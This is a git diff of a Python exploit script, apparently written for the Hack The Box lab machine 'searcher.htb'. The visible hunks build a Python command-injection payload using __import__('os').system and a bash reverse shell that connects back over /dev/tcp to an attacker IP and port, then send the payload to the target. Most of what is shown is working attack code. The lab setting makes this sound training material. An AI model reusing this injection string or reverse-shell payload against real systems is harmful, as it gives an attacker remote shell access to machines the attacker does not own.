@@ -13,7 +13,7 @@ proxies={"http":"http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 # TODO #1 Build a reverse shell payload using the CLI arguments provided by the user
 def buildPayload():
     # This is our sanity check to confirm command injection. Follow this format and replace your system('COMMAND') as needed.
-    # payload = "',__import__('os').system('ping -c2 10.10.14.9'))#"
+    # payload = f"',__import__('os').system('ping -c2 {ATK_Machine}'))#"
 
     rev_Shell = f"/bin/bash -l > /dev/tcp/{ATK_Machine}/{ATK_PORT} 0<&1 2>&1"
     byte_shell = rev_Shell.encode('ascii')
@@ -39,5 +39,5 @@ if __name__ == "__main__":
         print("[-] Usage: %s <hostname> <ATK_IP> <ATK_PORT>" % sys.argv[0])
         print("[-] Example: %s searcher.htb 10.10.14.10 4242" % sys.argv[0])
         exit(-1)
-    blah = buildPayload()
-    make_request(blah)
+    finalPayload = buildPayload()
+    make_request(finalPayload)
